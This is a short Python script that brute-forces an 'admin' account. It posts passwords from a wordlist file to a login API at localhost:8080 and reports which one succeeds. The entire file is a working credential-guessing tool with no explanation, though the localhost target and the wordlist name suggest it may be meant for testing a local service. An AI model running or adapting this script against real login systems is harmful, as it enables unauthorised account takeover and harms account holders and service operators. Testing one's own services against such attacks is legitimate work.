import requests
import json

target_url = "http://localhost:8080/api/auth/login"

def attempt_login(username, password):
    headers = {
        "Content-Type": "application/json"}
    payload = {
        "username": username,
        "password": password,
        "rememberMe": False
    }
    response = requests.post(target_url, headers=headers, json=payload)
    return response

def main():
    username = "admin"
    wordlist = "test-wordlist.txt"
    
    with open(wordlist, "r") as f:
        for line in f:
            password = line.strip()
            print(f"[*] Testing {username}:{password}")
            response = attempt_login(username, password)
            if response.status_code == 200:
                print(f"[+] Success! {username}:{password}")
                break
            elif response.status_code == 400:
                print(f"[-] Failed login attempt for {username}:{password}")

if __name__ == "__main__":
    main()